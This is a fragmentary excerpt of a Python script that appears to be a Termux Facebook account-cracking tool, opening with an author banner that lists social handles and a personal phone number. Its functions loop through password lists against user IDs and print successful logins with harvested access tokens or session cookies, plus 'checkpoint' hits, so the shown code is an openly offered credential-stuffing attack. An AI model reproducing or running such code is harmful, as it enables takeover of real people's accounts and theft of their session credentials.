...
\x1b[0;33m║WELCOME TO MY TOOLS  [🔥 BD-TERMUX 🔥].  ║

\x1b[0;33m║       #TOOL AUTHOR [MEHEDI HASAN TONU]  ║
...
\x1b[0;33m║#YOUTUBE : BD-TERMUX😐.  ║

\x1b[0;33m║#FACEBOOK : NAME [MEHEDI HASAN TONU].       ║

\x1b[0;33m║#GITHUB :  TONU-143   ║

\x1b[0;33m║#WHATSAPP : 01759916221                  ║
...
def cek_ttl_cp(uid, pw):
	...
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[TONU-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[TONU-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				...
				print("\r\033[0;95m[TONU-CP] %s|%s\033[0;92m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[TONU-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[TONU-CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[TONU-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[TONU-CP] %s|%s\033[0;91m        "%(uid, pw))
